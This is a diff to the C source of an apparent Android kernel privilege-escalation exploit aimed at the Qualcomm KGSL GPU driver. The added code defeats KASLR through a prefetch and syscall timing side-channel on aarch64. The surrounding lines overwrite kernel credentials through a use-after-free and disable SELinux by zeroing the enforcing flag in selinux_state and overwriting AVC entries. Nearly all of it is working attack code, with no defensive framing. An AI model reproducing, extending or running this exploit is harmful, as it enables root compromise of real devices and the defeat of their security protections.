@@ -29,6 +29,72 @@ static void die(const char *msg) { perror(msg); exit(1); }
 static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
+#if defined(__aarch64__)
+static inline uint64_t read_virtual_counter(void) {
+    uint64_t value;
+    __asm__ volatile("isb\n\tmrs %0, cntvct_el0\n\tisb" : "=r"(value));
+    return value;
+}
+
+static uint64_t measure_prefetch(uintptr_t address) {
+    __asm__ volatile("dsb sy\n\tisb" ::: "memory");
+    uint64_t started = read_virtual_counter();
+    for (int i = 0; i < 1024; ++i) {
+        __asm__ volatile("prfm pldl1keep, [%0]" : : "r"(address) : "memory");
+    }
+    __asm__ volatile("dsb sy\n\tisb" ::: "memory");
+    return read_virtual_counter() - started;
+}
+
+static uint64_t measure_syscall_register(uintptr_t address) {
+    register uint64_t x0 __asm__("x0") = address;
+    register uint64_t x8 __asm__("x8") = SYS_getpid;
+    __asm__ volatile("dsb sy\n\tisb" ::: "memory");
+    uint64_t started = read_virtual_counter();
+    for (int i = 0; i < 32; ++i) {
+        x0 = address;
+        __asm__ volatile("svc #0" : "+r"(x0) : "r"(x8) : "memory", "cc");
+    }
+    __asm__ volatile("isb" ::: "memory");
+    return read_virtual_counter() - started;
+}
+
+static int compare_u64(const void *left, const void *right) {
+    uint64_t a = *(const uint64_t *)left;
+    uint64_t b = *(const uint64_t *)right;
+    return (a > b) - (a < b);
+}
+
+static uint64_t filtered_measurement(uintptr_t address,
+                                     uint64_t (*measure)(uintptr_t)) {
+    uint64_t samples[128];
+    for (size_t i = 0; i < sizeof(samples) / sizeof(samples[0]); ++i) {
+        samples[i] = measure(address);
+    }
+    qsort(samples, sizeof(samples) / sizeof(samples[0]), sizeof(samples[0]),
+          compare_u64);
+    uint64_t sum = 0;
+    for (size_t i = 0; i < 16; ++i) {
+        sum += samples[i];
+    }
+    return sum / 16;
+}
+
+static uint64_t detect_kaslr_timing(void) {
+    printf("[*] Trying timing-based KASLR detection (fallback)\n");
+    for (uintptr_t offset = 0; offset <= 0x1f0000; offset += 0x10000) {
+        uintptr_t address = 0xffffffc080000000ULL + offset; // 適当なベース
+        uint64_t prefetch = filtered_measurement(address, measure_prefetch);
+        uint64_t syscall_reg = filtered_measurement(address, measure_syscall_register);
+        if (prefetch > 1000 && syscall_reg > 1000) {
+            uint64_t base = address & ~0x1FFFFFULL;
+            printf("[+] Timing: possible base = 0x%lx\n", base);
+            return base;
+        }
+    }
+    return 0;
+}
+#endif
 
 static uint64_t detect_kaslr(uint64_t *base_out) {
     struct perf_event_attr pe = {0};
@@ -41,7 +107,17 @@ static uint64_t detect_kaslr(uint64_t *base_out) {
     pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;
 
     int fd = perf_open(&pe, 0, -1, -1, 0);
-    if (fd < 0) { printf("  perf_open: errno=%d\n", errno); return 0; }
+    if (fd < 0) { 
+        printf("  perf_open: errno=%d, trying fallback\n", errno);
+#if defined(__aarch64__)
+        uint64_t base = detect_kaslr_timing();
+        if (base) {
+            *base_out = base;
+            return base + OFFSET_INIT_CRED;
+        }
+#endif
+        return 0;
+    }
 
     int npages = 256;
     size_t mmap_size = (1 + npages) * 4096;
@@ -217,15 +293,39 @@ static void dump_avc_page(uint64_t va, uint32_t *d, int n_slots) {
     }
 }
 
+static void print_context_info(void) {
+    char context[256] = "unknown";
+    int fd = open("/proc/self/attr/current", O_RDONLY);
+    if (fd >= 0) {
+        ssize_t n = read(fd, context, sizeof(context)-1);
+        if (n > 0) {
+            context[n] = 0;
+            context[strcspn(context, "\r\n")] = 0;
+        }
+        close(fd);
+    }
+    printf("[*] SELinux context: %s\n", context);
+}
+
 int main(int argc, char **argv) {
     (void)argc; (void)argv;
     setbuf(stdout, NULL);
+    print_context_info();
+
+    int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
+    if (enforce_fd >= 0) {
+        char val;
+        if (read(enforce_fd, &val, 1) == 1) {
+            printf("[*] SELinux enforce = %c (%s)\n", val, val == '0' ? "permissive" : "enforcing");
+        }
+        close(enforce_fd);
+    }
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    printf("[*] Phase 0: Dynamic KASLR detection via perf\n");
+    printf("[*] Phase 0: Dynamic KASLR detection via perf (fallback timing if needed)\n");
     uint64_t kernel_base;
     uint64_t init_cred_addr = detect_kaslr(&kernel_base);
     if (!init_cred_addr) {
@@ -445,10 +545,8 @@ int main(int argc, char **argv) {
     flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
     printf("[+] Cred overwrite done\n");
 
-    // ===== Phase 9: Aggressive SELinux disabling =====
     printf("[*] Phase 9: Aggressive SELinux disabling\n");
 
-    // 1) Read selinux_state area
     memset(ib_m, 0, 0x10000);
     memset(dst_m, 0, 0x1000);
     uint32_t *cmd = (uint32_t *)ib_m;
@@ -473,7 +571,6 @@ int main(int argc, char **argv) {
     int enforcing_offset = -1;
     for (int i = 0; i < SELINUX_STATE_SCAN_SIZE / 4; i++) {
         if (state_data[i] == 1) {
-            // Check surrounding zeros to confirm it's a flag
             int zero_around = 0;
             for (int j = -2; j <= 2; j++) {
                 int idx = i + j;
@@ -490,7 +587,6 @@ int main(int argc, char **argv) {
 
     if (enforcing_offset >= 0) {
         printf("  Found enforcing flag at offset 0x%x (value = 1)\n", enforcing_offset);
-        // Write 0 to that offset
         uint64_t enforcing_addr = selinux_state_addr + enforcing_offset;
         memset(ib_m, 0, 0x10000);
         cmd = (uint32_t *)ib_m;
@@ -509,7 +605,6 @@ int main(int argc, char **argv) {
         printf("[+] SELinux enforcing flag zeroed\n");
     } else {
         printf("  Could not find enforcing flag; zeroing first 0x%x bytes of selinux_state\n", SELINUX_STATE_SCAN_SIZE);
-        // Zero entire scanned area
         memset(ib_m, 0, 0x10000);
         cmd = (uint32_t *)ib_m;
         dw = 0;
@@ -530,11 +625,7 @@ int main(int argc, char **argv) {
         printf("[+] Zeroed %d bytes of selinux_state\n", SELINUX_STATE_SCAN_SIZE);
     }
 
-    // 2) Additional: try to overwrite selinux_enforcing_boot (if offset known)
-    // but we don't have exact offset, so skip
-
-    // 3) AVC bypass as final fallback (in case selinux_state write didn't work)
-    printf("[*] Phase 9b: AVC bypass fallback (overwrite allowed fields)\n");
+    printf("[*] Phase 9b: AVC bypass fallback\n");
     uint64_t avc_vas[256];
     int n_avc = 0;
     uint64_t avc_scan_start = UAF_ADDR;
@@ -602,19 +693,15 @@ int main(int argc, char **argv) {
         }
         flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
         printf("[+] AVC allowed overwritten\n");
-    } else {
-        printf("[-] No AVC pages found\n");
     }
 
-    // Verify SELinux status by reading /sys/fs/selinux/enforce
-    int enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
+    enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
     if (enforce_fd >= 0) {
         char val;
         if (read(enforce_fd, &val, 1) == 1) {
             printf("[*] SELinux enforce = %c\n", val);
             if (val == '1') {
-                // Still enforcing, try one more direct write to selinux_state+0
-                printf("  Still enforcing; trying to zero selinux_state+0 explicitly\n");
+                printf("  Still enforcing; trying explicit zero of selinux_state+0\n");
                 memset(ib_m, 0, 0x10000);
                 cmd = (uint32_t *)ib_m;
                 dw = 0;
